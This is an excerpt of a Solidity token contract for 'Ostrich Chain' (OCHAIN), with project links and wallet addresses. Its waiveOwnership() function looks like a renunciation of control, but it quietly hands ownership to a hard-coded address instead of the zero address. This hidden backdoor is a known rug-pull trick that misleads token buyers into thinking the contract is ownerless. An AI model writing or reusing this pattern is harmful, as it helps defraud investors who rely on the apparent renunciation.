...
/**
Website : https://ostrichain.site
Telegram : https://t.me/ostrichchain
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x00D6C58901aFb3E409c035F6989D867Fe3fc0EB7);
    }
...
contract OstrichChain is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Ostrich Chain";
    string private _symbol = "OCHAIN";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x4C62E7BF857e4Aa32db79a9b09E9913B28F6976A);
    address payable public teamWalletAddress = payable(0x4C62E7BF857e4Aa32db79a9b09E9913B28F6976A);
